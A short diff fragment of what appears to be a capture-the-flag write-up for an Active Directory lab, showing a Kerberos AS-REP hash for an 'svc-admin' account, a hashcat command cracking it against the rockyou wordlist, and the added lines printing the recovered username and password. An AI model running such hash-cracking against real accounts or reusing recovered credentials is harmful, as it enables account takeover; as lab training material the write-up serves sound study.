@@ -27,3 +27,10 @@ $krb5asrep$23$svc-admin@THM-AD:640b2ef8c30934a79586ffcb60934d54$df250ebd2428bb74
 ```
 hashcat -a 0 -m 18200 crack.txt /usr/share/wordlists/rockyou.txt
 ```
+
+reveals the creds:
+```
+svc-admin:management2005
+```
+
+
